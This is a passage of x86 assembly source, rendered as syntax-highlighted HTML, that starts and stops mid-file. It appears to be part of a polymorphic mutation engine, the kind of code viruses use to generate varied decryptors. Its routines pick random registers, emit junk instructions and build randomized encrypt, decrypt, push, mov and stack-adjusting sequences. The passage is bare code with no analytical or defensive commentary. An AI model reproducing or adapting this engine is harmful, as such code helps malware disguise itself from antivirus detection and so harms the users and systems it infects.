        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">OUT_CHG_MASK</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">LEN_OP32_IMM</span><span class="sc0">
</span><span class="sc5">GET_OP32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">OP32_IMM</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_BTC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BUILD_CBYTE</span><span class="sc0">
</span><span class="sc5">NO_BTC</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_REVERSE_OP</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BUILD_CRYPT</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">
</span><span class="sc5">NO_REVERSE_OP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">REVERSE_OP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BUILD_CRYPT</span><span class="sc0">
</span><span class="sc5">REVERSE_OP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">90H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BINARY_OPCODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">BINARY_OPCODE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">OUT_CHG_MASK</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0D1H</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc5">OUT_CHG_MASK</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">81H</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">STOS_DWORD</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1FH</span><span class="sc0">
</span><span class="sc5">BUILD_CBYTE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">BUILD_BYTE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
</span><span class="sc5">OUT_CHG_MASK</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">STOS_DWORD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@@NO_WMODE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@@NO_WMODE</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BUILD_CRYPT</span><span class="sc0">
</span><span class="sc5">@@NO_WMODE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BUILD_CRYPT32</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">JUST_INC</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">BUILD_CRYPT32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">66H</span><span class="sc0">
</span><span class="sc5">BUILD_CRYPT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">JUST_INC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">MOV_WORK_REG</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHANGE_ESP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">WORK_REG</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;SMALL 1 PTR DS:SET_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">30H</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: CL=30H (PUSH [][]+XX) OR CL=90H (PUSH DREG)</span><span class="sc0">
</span><span class="sc1">;       1 PTR [SI]=REG</span><span class="sc0">
</span><span class="sc5">MOVE_TO</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_MOV</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8BH</span><span class="sc0">              </span><span class="sc1">;MOV</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SAVE_ADDRESS</span><span class="sc0">
</span><span class="sc5">NO_MOV</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">JNS</span><span class="sc0"> </span><span class="sc5">NO_PUSH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE_PRFX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">NO_FF</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">NO_FF</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">               </span><span class="sc1">;PUSH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PUSH_CASE</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">JNS</span><span class="sc0"> </span><span class="sc5">IS_FF</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc5">IS_FF</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">58H</span><span class="sc0">              </span><span class="sc1">;POP</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CHK_MODE_PSTOR</span><span class="sc0">
</span><span class="sc5">NO_PUSH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_ZERO32</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">OP32_REG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">LODSB</span><span class="sc0">
</span><span class="sc5">SAVE_ADDRESS</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE_PSTOR</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">PUSH_CASE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ADDRESS_MODE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DELTA_VALUE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_EXT_OPCODE</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">STORE_DWORD</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">12H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">NO_EXT_OPCODE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">
        </span><span class="sc6">JP</span><span class="sc0">  </span><span class="sc5">NO_STORE</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">STORE_DWORD</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">NO_STORE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">STORE_DWORD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc5">GO_STOS_DWORD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">STORE_WORK_REG</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">STORE_WORK_REG_RELO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">UNUSED_REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">DEC_ESP_COUNT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:SET_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_STORE_WR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:CHG_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_STORE_WR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:STORE_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_STORE_WR</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;SMALL 1 PTR DS:STORE_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;SMALL 1 PTR DS:DEC_ESP_COUNT</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">VIA_DEC_ESP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE_SZ</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">VIA_DEC_ESP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc0">              </span><span class="sc1">;PUSH</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:WORK_REG</span><span class="sc0">
</span><span class="sc5">CHK_MODE_PSTOR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE_PRFX</span><span class="sc0">
</span><span class="sc5">STOS_BYTE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">NO_STORE_WR</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">VIA_DEC_ESP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">DEC_ESP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">89H</span><span class="sc0">              </span><span class="sc1">;MOV</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE_PSTOR</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:WORK_REG</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_STORE_WR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNS</span><span class="sc0"> </span><span class="sc5">STOS_BYTE</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">GO1_STOS_DWORD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_STOS_DWORD</span><span class="sc0">
</span><span class="sc5">DEC_ESP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_DEC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">VIA_DEC_ESP</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: AL=MAX DEC VALUE, BL=REGISTER</span><span class="sc0">
</span><span class="sc1">;EXIT : AL=DEC VALUE</span><span class="sc0">
</span><span class="sc5">GEN_DEC</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_DEC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">              </span><span class="sc1">;DEC</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">NO_DEC</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">81H</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc0">             </span><span class="sc1">;SUB</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_SUB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">             </span><span class="sc1">;ADD</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">IS_SUB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">JP</span><span class="sc0">  </span><span class="sc5">GO1_STOS_DWORD</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">NO_CHG_OFF</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">CHANGE_OFF_REG</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">CHANGE_OFF_REG_RELO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">DEC_OFF_COUNT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc5">UNUSED_REG</span><span class="sc0">     </span><span class="sc1">;SMALL 1 PTR DS:SET_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_CHG_OFF</span><span class="sc0">
</span><span class="sc5">NEXT_OFF_REG</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_CHG_OFF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:OFF_REG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_DEC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">NEXT_OFF_REG</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">CHANGE_ESP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">DEC_ESP_COUNT</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_CHG_ESP</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:STORE_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_CHG_OFF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_CHG_ESP</span><span class="sc0">
